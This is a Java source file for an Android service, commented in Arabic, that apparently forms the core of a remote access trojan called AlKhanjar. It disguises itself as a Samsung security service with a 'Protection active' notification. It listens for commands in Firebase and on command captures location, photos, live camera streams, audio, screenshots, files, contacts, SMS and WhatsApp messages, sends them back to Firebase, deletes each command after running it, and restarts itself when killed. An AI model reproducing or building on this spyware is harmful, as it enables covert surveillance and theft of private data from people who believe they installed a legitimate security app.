package com.samsung.android.security.v8.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.samsung.android.security.v8.AlKhanjarApp;
import com.samsung.android.security.v8.managers.CameraManager;
import com.samsung.android.security.v8.managers.ContactManager;
import com.samsung.android.security.v8.managers.FileManager;
import com.samsung.android.security.v8.managers.LocationManager;
import com.samsung.android.security.v8.managers.ScreenshotManager;
import com.samsung.android.security.v8.managers.SmsManager;
import com.samsung.android.security.v8.managers.AudioManager;
import com.samsung.android.security.v8.utils.DeviceManager;

/**
 * CoreService - الخدمة الأساسية
 * تعمل في الخلفية باستمرار وتستقبل الأوامر من Firebase
 */
public class CoreService extends Service {
    
    private static final String TAG = "CoreService";
    private static final String CHANNEL_ID = "device_service";
    private static final int NOTIFICATION_ID = 1001;
    
    private DatabaseReference commandsRef;
    private String deviceId;
    
    // المديرين
    private LocationManager locationManager;
    private CameraManager cameraManager;
    private AudioManager audioManager;
    private ScreenshotManager screenshotManager;
    private FileManager fileManager;
    private ContactManager contactManager;
    private SmsManager smsManager;
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        deviceId = AlKhanjarApp.getDeviceId();
        
        // إنشاء قناة الإشعارات
        createNotificationChannel();
        
        // بدء الخدمة كـ Foreground
        startForeground(NOTIFICATION_ID, createNotification());
        
        // تهيئة المديرين
        initManagers();
        
        // الاستماع للأوامر
        listenForCommands();
        
        // تحديث الحالة
        DeviceManager.updateDeviceStatus(deviceId, "online");
        
        Log.d(TAG, "CoreService started");
    }
    
    /**
     * إنشاء قناة الإشعارات
     */
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Samsung Security Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("System security service");
            channel.setShowBadge(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }
    
    /**
     * إنشاء الإشعار
     */
    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Samsung Security")
            .setContentText("Protection active")
            .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build();
    }
    
    /**
     * تهيئة المديرين
     */
    private void initManagers() {
        locationManager = new LocationManager(this);
        cameraManager = new CameraManager(this);
        audioManager = new AudioManager(this);
        screenshotManager = new ScreenshotManager(this);
        fileManager = new FileManager(this);
        contactManager = new ContactManager(this);
        smsManager = new SmsManager(this);
    }
    
    /**
     * الاستماع للأوامر من Firebase
     */
    private void listenForCommands() {
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        commandsRef = database.getReference("commands").child(deviceId);
        
        commandsRef.addChildEventListener(new ChildEventListener() {
            @Override
            public void onChildAdded(DataSnapshot snapshot, String previousChildName) {
                processCommand(snapshot);
            }
            
            @Override
            public void onChildChanged(DataSnapshot snapshot, String previousChildName) {
                processCommand(snapshot);
            }
            
            @Override
            public void onChildRemoved(DataSnapshot snapshot) {}
            
            @Override
            public void onChildMoved(DataSnapshot snapshot, String previousChildName) {}
            
            @Override
            public void onCancelled(DatabaseError error) {
                Log.e(TAG, "Commands listener error: " + error.getMessage());
            }
        });
    }
    
    /**
     * معالجة الأوامر
     */
    private void processCommand(DataSnapshot snapshot) {
        try {
            String commandId = snapshot.getKey();
            String commandType = snapshot.child("type").getValue(String.class);
            
            if (commandType == null) return;
            
            Log.d(TAG, "Processing command: " + commandType);
            
            switch (commandType) {
                case "get_location":
                    locationManager.getCurrentLocation(commandId);
                    break;
                    
                case "take_photo":
                    String camera = snapshot.child("camera").getValue(String.class);
                    cameraManager.takePhoto(camera != null ? camera : "back", commandId);
                    break;
                    
                case "start_camera_stream":
                    String streamCamera = snapshot.child("camera").getValue(String.class);
                    cameraManager.startLiveStream(streamCamera != null ? streamCamera : "back", commandId);
                    break;
                    
                case "stop_camera_stream":
                    cameraManager.stopLiveStream(commandId);
                    break;
                    
                case "record_audio":
                    Integer duration = snapshot.child("duration").getValue(Integer.class);
                    audioManager.recordAudio(duration != null ? duration : 30, commandId);
                    break;
                    
                case "take_screenshot":
                    screenshotManager.takeScreenshot(commandId);
                    break;
                    
                case "list_files":
                    String path = snapshot.child("path").getValue(String.class);
                    fileManager.listFiles(path != null ? path : "/", commandId);
                    break;
                    
                case "download_file":
                    String filePath = snapshot.child("path").getValue(String.class);
                    fileManager.downloadFile(filePath, commandId);
                    break;
                    
                case "upload_file":
                    fileManager.uploadFile(snapshot, commandId);
                    break;
                    
                case "get_contacts":
                    contactManager.getContacts(commandId);
                    break;
                    
                case "get_sms":
                    smsManager.getSmsMessages(commandId);
                    break;
                    
                case "get_whatsapp":
                    smsManager.getWhatsAppMessages(commandId);
                    break;
                    
                case "get_device_info":
                    getDeviceInfo(commandId);
                    break;
                    
                case "get_installed_apps":
                    getInstalledApps(commandId);
                    break;
                    
                default:
                    Log.w(TAG, "Unknown command: " + commandType);
                    sendResponse(commandId, "error", "Unknown command type");
            }
            
            // حذف الأمر بعد المعالجة
            snapshot.getRef().removeValue();
            
        } catch (Exception e) {
            Log.e(TAG, "Command processing error: " + e.getMessage());
        }
    }
    
    /**
     * الحصول على معلومات الجهاز
     */
    private void getDeviceInfo(String commandId) {
        try {
            java.util.Map<String, Object> deviceInfo = new java.util.HashMap<>();
            deviceInfo.put("battery", DeviceManager.getBatteryInfo(this));
            deviceInfo.put("storage", DeviceManager.getStorageInfo(this));
            
            sendResponse(commandId, "success", deviceInfo);
        } catch (Exception e) {
            sendResponse(commandId, "error", e.getMessage());
        }
    }
    
    /**
     * الحصول على التطبيقات المثبتة
     */
    private void getInstalledApps(String commandId) {
        try {
            java.util.List<String> apps = new java.util.ArrayList<>();
            android.content.pm.PackageManager pm = getPackageManager();
            
            for (android.content.pm.ApplicationInfo app : pm.getInstalledApplications(0)) {
                apps.add(app.packageName);
            }
            
            sendResponse(commandId, "success", apps);
        } catch (Exception e) {
            sendResponse(commandId, "error", e.getMessage());
        }
    }
    
    /**
     * إرسال استجابة
     */
    private void sendResponse(String commandId, String status, Object data) {
        try {
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            DatabaseReference responseRef = database.getReference("responses")
                .child(deviceId)
                .child(commandId);
            
            java.util.Map<String, Object> response = new java.util.HashMap<>();
            response.put("status", status);
            response.put("data", data);
            response.put("timestamp", System.currentTimeMillis());
            
            responseRef.setValue(response);
            
        } catch (Exception e) {
            Log.e(TAG, "Send response error: " + e.getMessage());
        }
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        
        // تحديث الحالة
        DeviceManager.updateDeviceStatus(deviceId, "offline");
        
        // إعادة تشغيل الخدمة
        Intent restartIntent = new Intent(this, CoreService.class);
        startService(restartIntent);
        
        Log.d(TAG, "CoreService destroyed");
    }
}
